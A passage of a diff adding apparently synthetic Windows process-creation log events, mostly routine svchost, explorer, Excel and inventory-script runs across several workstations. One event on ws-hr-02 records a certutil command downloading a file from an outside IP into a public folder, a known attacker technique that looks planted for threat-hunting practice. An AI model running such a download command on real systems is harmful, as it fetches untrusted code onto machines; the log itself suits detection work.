+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T12:18:35Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T12:20:53Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T12:22:19Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T12:27:01Z",
+   "event_type": "process_creation",
+   "user": "d.okafor",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T12:28:22Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T12:28:33Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T12:30:02Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T12:39:01Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T12:40:47Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T12:42:07Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T12:45:43Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T12:48:10Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T12:50:07Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T12:52:08Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T12:54:53Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T12:54:59Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T12:57:08Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:00:22Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:00:35Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:04:00Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:06:54Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:10:01Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:13:14Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:13:19Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:14:21Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:19:28Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:20:49Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:22:53Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:27:36Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:28:33Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:29:31Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:31:08Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:31:26Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:32:55Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:35:11Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:40:00Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\System32\\certutil.exe",
+   "CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.77/update.txt C:\\Users\\Public\\update.txt",
+   "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:40:48Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:42:15Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:45:14Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:48:08Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:48:21Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:49:23Z",
+   "event_type": "process_creation",
+   "user": "d.okafor",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:50:47Z",
+   "event_type": "process_creation",
+   "user": "d.okafor",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:52:23Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:52:26Z",
+   "event_type": "process_creation",
+   "user": "d.okafor",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:55:11Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:56:38Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T13:59:28Z",
+   "event_type": "process_creation",
+   "user": "d.okafor",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T14:03:53Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T14:06:11Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T14:06:49Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T14:08:13Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T14:13:35Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T14:13:42Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T14:13:54Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T14:18:28Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T14:20:03Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T14:23:31Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T14:26:06Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T14:28:06Z",
+   "event_type": "process_creation",
+   "user": "d.okafor",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T14:31:10Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T14:31:10Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T14:32:37Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T14:38:56Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T14:41:16Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T14:47:48Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T14:50:47Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T14:52:01Z",
+   "event_type": "process_creation",
+   "user": "d.okafor",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T14:54:50Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T15:03:15Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T15:03:55Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T15:04:55Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T15:17:37Z",
+   "event_type": "process_creation",
+   "user": "d.okafor",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T15:22:27Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T15:25:02Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T15:28:28Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T15:29:11Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T15:35:37Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T15:45:09Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T15:45:24Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T15:46:27Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T15:50:21Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T15:52:50Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T15:54:51Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T15:56:42Z",
+   "event_type": "process_creation",
+   "user": "d.okafor",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T15:57:40Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "srv-file-01",
